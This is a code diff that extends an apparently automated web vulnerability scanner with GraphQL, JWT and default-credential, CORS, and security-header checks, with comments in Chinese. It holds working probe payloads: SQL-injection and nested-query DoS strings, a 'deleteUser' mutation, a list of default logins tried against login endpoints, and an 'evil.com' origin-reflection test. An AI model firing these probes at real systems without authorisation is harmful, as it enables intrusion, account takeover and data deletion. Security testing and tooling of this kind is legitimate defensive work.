@@ -188,6 +188,22 @@ class ScannerAgent(BaseAgent):
         if strategy.get("test_cmd_injection", True):
             scan_tasks.append(("cmd_injection", self._test_cmd_injection(targets)))
 
+        # 9. GraphQL 注入
+        if strategy.get("test_graphql", True):
+            scan_tasks.append(("graphql", self._test_graphql(targets)))
+
+        # 10. JWT 攻击 + 认证绕过
+        if strategy.get("test_jwt", True):
+            scan_tasks.append(("jwt", self._test_jwt(targets)))
+
+        # 11. CORS 配置
+        if strategy.get("test_cors", True):
+            scan_tasks.append(("cors", self._test_cors(targets)))
+
+        # 12. 安全头审计
+        if strategy.get("test_headers", True):
+            scan_tasks.append(("headers", self._test_security_headers(targets)))
+
         # 并发执行
         logger.info("[scanner] 启动 %d 个检测模块...", len(scan_tasks))
         results = await asyncio.gather(
@@ -334,7 +350,8 @@ class ScannerAgent(BaseAgent):
             "返回格式:\n"
             '{"use_nuclei": true, "test_sqli": true, "test_xss": true, '
             '"test_ssrf": false, "test_idor": true, "test_redirect": true, '
-            '"test_dir_traversal": true, "test_cmd_injection": false}'
+            '"test_dir_traversal": true, "test_cmd_injection": false, '
+            '"test_graphql": true, "test_jwt": true, "test_cors": true, "test_headers": true}'
         )
 
         try:
@@ -353,6 +370,8 @@ class ScannerAgent(BaseAgent):
                 "use_nuclei": True, "test_sqli": True, "test_xss": True,
                 "test_ssrf": True, "test_idor": True, "test_redirect": True,
                 "test_dir_traversal": True, "test_cmd_injection": True,
+                "test_graphql": True, "test_jwt": True, "test_cors": True,
+                "test_headers": True,
             }
 
     # ---- Nuclei 模板扫描 ----
@@ -845,6 +864,410 @@ class ScannerAgent(BaseAgent):
                                 findings.append(f)
                                 self.findings.append(f)
                                 return findings
+
+        return findings
+
+    # ---- GraphQL 注入检测 ----
+
+    async def _test_graphql(self, targets: dict) -> list[Finding]:
+        """GraphQL 注入和信息泄露检测"""
+        findings = []
+        graphql_endpoints = []
+
+        # 从 API 端点中筛选 GraphQL 端点
+        for ep in targets["api_endpoints"]:
+            if any(kw in ep.lower() for kw in ["graphql", "gql"]):
+                graphql_endpoints.append(ep)
+
+        # 常见 GraphQL 路径
+        for url in targets["urls"][:2]:
+            base = url.rstrip("/")
+            for path in ["/graphql", "/gql", "/graphiql", "/v1/graphql"]:
+                ep = f"{base}{path}"
+                if ep not in graphql_endpoints:
+                    r = await run_command(f"curl -s -o /dev/null -w '%{{http_code}}' -m 3 '{ep}'", timeout=5)
+                    if r.success and r.stdout.strip().strip("'\" ") in ("200", "400", "405"):
+                        graphql_endpoints.append(ep)
+
+        for ep in graphql_endpoints[:3]:
+            # 1. 内省查询（Introspection）
+            introspection_query = '{"query":"{ __schema { types { name fields { name } } } }"}'
+            r = await run_command(
+                f"curl -sL -m 10 -X POST -H 'Content-Type: application/json' -d '{introspection_query}' '{ep}'",
+                timeout=15,
+            )
+            if r.success and "__schema" in r.stdout and "types" in r.stdout:
+                # 解析类型数量
+                type_count = r.stdout.count('"name"')
+                f = Finding(
+                    vuln_type="graphql",
+                    title=f"GraphQL 内省查询已启用: {ep}",
+                    url=ep, parameter="introspection",
+                    payload=introspection_query,
+                    evidence=f"内省查询返回 {type_count} 个字段定义",
+                    severity="medium", confidence="confirmed",
+                    poc=f"curl -X POST -H 'Content-Type: application/json' -d '{introspection_query}' {ep}",
+                )
+                findings.append(f)
+                self.findings.append(f)
+
+                # 2. 检查敏感类型
+                sensitive_types = ["User", "Admin", "Password", "Token", "Secret", "Credential", "Session"]
+                for stype in sensitive_types:
+                    if f'"{stype}"' in r.stdout or f"'{stype}'" in r.stdout:
+                        f = Finding(
+                            vuln_type="graphql",
+                            title=f"GraphQL 暴露敏感类型: {stype}",
+                            url=ep, parameter="schema",
+                            evidence=f"内省响应中包含类型 {stype}",
+                            severity="high", confidence="probable",
+                        )
+                        findings.append(f)
+                        self.findings.append(f)
+                        break
+
+            # 3. GraphQL 注入测试
+            injection_payloads = [
+                '{"query":"{ user(id: \\"1 OR 1=1\\") { id email } }"}',
+                '{"query":"{ user(id: null) { id email } }"}',
+                '{"query":"mutation { deleteUser(id: \\"1\\") { id } }"}',
+            ]
+            for payload in injection_payloads:
+                r = await run_command(
+                    f"curl -sL -m 10 -X POST -H 'Content-Type: application/json' -d '{payload}' '{ep}'",
+                    timeout=15,
+                )
+                if r.success:
+                    resp = r.stdout.lower()
+                    if any(kw in resp for kw in ["error", "sql", "syntax", "exception", "stack"]):
+                        if "sql" in resp or "syntax" in resp:
+                            f = Finding(
+                                vuln_type="sqli",
+                                title=f"GraphQL SQL 注入: {ep}",
+                                url=ep, parameter="query",
+                                payload=payload,
+                                evidence=r.stdout[:200],
+                                severity="critical", confidence="probable",
+                                poc=f"curl -X POST -H 'Content-Type: application/json' -d '{payload}' {ep}",
+                            )
+                            findings.append(f)
+                            self.findings.append(f)
+                            return findings
+
+            # 4. 深度查询 DoS 测试（嵌套查询）
+            deep_query = '{"query":"{ __typename ...on Query { __typename ...on Query { __typename ...on Query { __typename } } } }"}'
+            r = await run_command(
+                f"curl -sL -m 15 -X POST -H 'Content-Type: application/json' -d '{deep_query}' '{ep}'",
+                timeout=20,
+            )
+            if r.success and r.timed_out is False and len(r.stdout) > 1000:
+                f = Finding(
+                    vuln_type="graphql",
+                    title=f"GraphQL 深度查询可能未限制: {ep}",
+                    url=ep, parameter="query depth",
+                    payload=deep_query,
+                    evidence=f"深度查询返回 {len(r.stdout)} bytes",
+                    severity="medium", confidence="possible",
+                )
+                findings.append(f)
+                self.findings.append(f)
+
+        return findings
+
+    # ---- JWT 攻击检测 ----
+
+    async def _test_jwt(self, targets: dict) -> list[Finding]:
+        """JWT 令牌安全检测"""
+        findings = []
+
+        for url in targets["urls"][:3]:
+            # 1. 获取响应头，检查是否有 JWT 相关 Cookie 或 Header
+            r = await run_command(f"curl -sI -m 5 '{url}'", timeout=10)
+            if not r.success:
+                continue
+
+            headers = r.stdout
+
+            # 检查 Set-Cookie 中是否有 token/jwt
+            token_cookies = re.findall(
+                r'(?i)set-cookie:\s*(token|jwt|auth|session|access_token|id_token)=([^;\s]+)',
+                headers,
+            )
+
+            # 检查响应体中的 JWT
+            body_r = await run_command(f"curl -sL -m 5 '{url}'", timeout=10)
+            if body_r.success:
+                # 查找 JWT 格式的 token (eyJ...)
+                jwt_pattern = r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'
+                jwt_matches = re.findall(jwt_pattern, body_r.stdout)
+
+                for token in jwt_matches[:3]:
+                    # 解码 JWT header
+                    try:
+                        import base64
+                        header_b64 = token.split(".")[0]
+                        # 补齐 padding
+                        header_b64 += "=" * (4 - len(header_b64) % 4)
+                        header_json = base64.urlsafe_b64decode(header_b64).decode()
+                        header = json.loads(header_json)
+                        alg = header.get("alg", "")
+
+                        # 检查 none 算法
+                        if alg.lower() == "none":
+                            f = Finding(
+                                vuln_type="jwt",
+                                title="JWT None 算法漏洞",
+                                url=url, parameter="alg",
+                                payload=f"alg: {alg}",
+                                evidence=f"JWT 使用 none 算法，可绕过签名验证",
+                                severity="critical", confidence="confirmed",
+                                poc=f"修改 JWT header: {{'alg': 'none'}}, 删除签名部分",
+                            )
+                            findings.append(f)
+                            self.findings.append(f)
+
+                        # 检查弱算法
+                        elif alg in ("HS256", "HS384", "HS512"):
+                            f = Finding(
+                                vuln_type="jwt",
+                                title=f"JWT 使用对称算法 {alg}（可能被暴力破解）",
+                                url=url, parameter="alg",
+                                payload=f"alg: {alg}",
+                                evidence=f"JWT 使用 {alg}，如果密钥弱可被破解",
+                                severity="medium", confidence="possible",
+                            )
+                            findings.append(f)
+                            self.findings.append(f)
+
+                    except Exception:
+                        pass
+
+        # 2. 测试登录端点获取 JWT
+        login_endpoints = []
+        for ep in targets["api_endpoints"]:
+            if any(kw in ep.lower() for kw in ["login", "auth", "token", "signin"]):
+                login_endpoints.append(ep)
+
+        # 常见登录路径
+        for url in targets["urls"][:2]:
+            base = url.rstrip("/")
+            for path in ["/api/login", "/api/auth", "/api/token", "/login", "/auth"]:
+                ep = f"{base}{path}"
+                if ep not in login_endpoints:
+                    r = await run_command(f"curl -s -o /dev/null -w '%{{http_code}}' -m 3 '{ep}'", timeout=5)
+                    if r.success and r.stdout.strip().strip("'\" ") in ("200", "400", "401", "405"):
+                        login_endpoints.append(ep)
+
+        # 测试默认凭据
+        default_creds = [
+            ("admin", "admin"), ("admin", "admin123"), ("admin", "password"),
+            ("admin@juice-sh.op", "admin123"), ("admin@example.com", "admin"),
+            ("test", "test"), ("user", "user"), ("root", "root"),
+        ]
+
+        for ep in login_endpoints[:3]:
+            for username, password in default_creds[:5]:
+                payload = json.dumps({"email": username, "password": password})
+                r = await run_command(
+                    f"curl -sL -m 10 -X POST -H 'Content-Type: application/json' -d '{payload}' '{ep}'",
+                    timeout=15,
+                )
+                if r.success:
+                    resp = r.stdout.lower()
+                    # 成功登录通常返回 token
+                    if "token" in resp and ("authentication" in resp or "bearer" in resp or "jwt" in resp):
+                        f = Finding(
+                            vuln_type="auth",
+                            title=f"默认凭据可登录: {username}",
+                            url=ep, parameter="credentials",
+                            payload=f"email={username}&password={password}",
+                            evidence="登录成功，返回 authentication token",
+                            severity="critical", confidence="confirmed",
+                            poc=f"curl -X POST -H 'Content-Type: application/json' -d '{payload}' {ep}",
+                        )
+                        findings.append(f)
+                        self.findings.append(f)
+                        return findings  # 找到一个就够了
+
+        return findings
+
+    # ---- CORS 配置检测 ----
+
+    async def _test_cors(self, targets: dict) -> list[Finding]:
+        """CORS 配置错误检测"""
+        findings = []
+        evil_origin = "https://evil.com"
+
+        for url in targets["urls"][:3]:
+            # 测试任意 Origin 反射
+            r = await run_command(
+                f"curl -sI -m 5 -H 'Origin: {evil_origin}' '{url}'",
+                timeout=10,
+            )
+            if not r.success:
+                continue
+
+            headers = r.stdout
+            acao_match = re.search(r'(?i)^access-control-allow-origin:\s*(.+)', headers, re.MULTILINE)
+            acac_match = re.search(r'(?i)^access-control-allow-credentials:\s*(.+)', headers, re.MULTILINE)
+
+            if acao_match:
+                acao = acao_match.group(1).strip()
+                acac = acac_match.group(1).strip().lower() if acac_match else ""
+
+                # 任意 Origin 反射
+                if acao == evil_origin:
+                    severity = "critical" if acac == "true" else "high"
+                    f = Finding(
+                        vuln_type="cors",
+                        title=f"CORS 任意 Origin 反射" + ("（含凭据）" if acac == "true" else ""),
+                        url=url, parameter="Origin",
+                        payload=f"Origin: {evil_origin}",
+                        evidence=f"Access-Control-Allow-Origin: {acao}" +
+                                 (f", Access-Control-Allow-Credentials: {acac}" if acac else ""),
+                        severity=severity, confidence="confirmed",
+                        poc=f"curl -I -H 'Origin: {evil_origin}' {url}",
+                    )
+                    findings.append(f)
+                    self.findings.append(f)
+
+                # 通配符 *
+                elif acao == "*":
+                    if acac == "true":
+                        f = Finding(
+                            vuln_type="cors",
+                            title="CORS 通配符 * 配合 Allow-Credentials",
+                            url=url, parameter="Origin",
+                            payload="Origin: *",
+                            evidence="ACAO: *, ACAC: true（浏览器会阻止，但配置错误）",
+                            severity="medium", confidence="confirmed",
+                        )
+                        findings.append(f)
+                        self.findings.append(f)
+                    else:
+                        f = Finding(
+                            vuln_type="cors",
+                            title="CORS 通配符 *（允许任意来源）",
+                            url=url, parameter="Origin",
+                            evidence=f"Access-Control-Allow-Origin: *",
+                            severity="low", confidence="confirmed",
+                        )
+                        findings.append(f)
+                        self.findings.append(f)
+
+                # null Origin
+                elif acao == "null":
+                    r_null = await run_command(
+                        f"curl -sI -m 5 -H 'Origin: null' '{url}'", timeout=10,
+                    )
+                    if r_null.success and "access-control-allow-origin: null" in r_null.stdout.lower():
+                        f = Finding(
+                            vuln_type="cors",
+                            title="CORS 允许 null Origin（可从 iframe 利用）",
+                            url=url, parameter="Origin",
+                            payload="Origin: null",
+                            evidence="Access-Control-Allow-Origin: null",
+                            severity="high", confidence="confirmed",
+                            poc=f"curl -I -H 'Origin: null' {url}",
+                        )
+                        findings.append(f)
+                        self.findings.append(f)
+
+        return findings
+
+    # ---- 安全头审计 ----
+
+    async def _test_security_headers(self, targets: dict) -> list[Finding]:
+        """HTTP 安全头审计"""
+        findings = []
+
+        required_headers = {
+            "strict-transport-security": {
+                "name": "HSTS",
+                "severity": "medium",
+                "desc": "未启用 HTTP 严格传输安全，可能遭受 SSL 剥离攻击",
+            },
+            "content-security-policy": {
+                "name": "CSP",
+                "severity": "medium",
+                "desc": "未设置内容安全策略，增加 XSS 攻击风险",
+            },
+            "x-content-type-options": {
+                "name": "X-Content-Type-Options",
+                "severity": "low",
+                "desc": "未设置 X-Content-Type-Options，浏览器可能 MIME 嗅探",
+            },
+            "x-frame-options": {
+                "name": "X-Frame-Options",
+                "severity": "medium",
+                "desc": "未设置 X-Frame-Options，可能遭受点击劫持攻击",
+            },
+            "x-xss-protection": {
+                "name": "X-XSS-Protection",
+                "severity": "low",
+                "desc": "未设置 XSS 过滤头（现代浏览器已弃用，但仍建议设置）",
+            },
+            "referrer-policy": {
+                "name": "Referrer-Policy",
+                "severity": "low",
+                "desc": "未设置 Referrer 策略，可能泄露敏感 URL 信息",
+            },
+            "permissions-policy": {
+                "name": "Permissions-Policy",
+                "severity": "low",
+                "desc": "未设置权限策略，未限制浏览器功能访问",
+            },
+        }
+
+        for url in targets["urls"][:2]:
+            r = await run_command(f"curl -sI -m 5 '{url}'", timeout=10)
+            if not r.success:
+                continue
+
+            headers_lower = r.stdout.lower()
+            missing = []
+
+            for header, info in required_headers.items():
+                if header not in headers_lower:
+                    missing.append(info)
+                    f = Finding(
+                        vuln_type="header",
+                        title=f"缺失安全头: {info['name']}",
+                        url=url, parameter=header,
+                        evidence=info["desc"],
+                        severity=info["severity"], confidence="confirmed",
+                    )
+                    findings.append(f)
+                    self.findings.append(f)
+
+            # 检查危险头
+            if "server:" in headers_lower:
+                server_match = re.search(r'(?i)^server:\s*(.+)', r.stdout, re.MULTILINE)
+                if server_match:
+                    server = server_match.group(1).strip()
+                    f = Finding(
+                        vuln_type="header",
+                        title=f"服务器版本泄露: {server}",
+                        url=url, parameter="Server",
+                        evidence=f"Server 头暴露: {server}",
+                        severity="low", confidence="confirmed",
+                    )
+                    findings.append(f)
+                    self.findings.append(f)
+
+            if "x-powered-by:" in headers_lower:
+                powered_match = re.search(r'(?i)^x-powered-by:\s*(.+)', r.stdout, re.MULTILINE)
+                if powered_match:
+                    powered = powered_match.group(1).strip()
+                    f = Finding(
+                        vuln_type="header",
+                        title=f"技术栈泄露: X-Powered-By: {powered}",
+                        url=url, parameter="X-Powered-By",
+                        evidence=f"X-Powered-By 头暴露: {powered}",
+                        severity="low", confidence="confirmed",
+                    )
+                    findings.append(f)
+                    self.findings.append(f)
 
         return findings
 
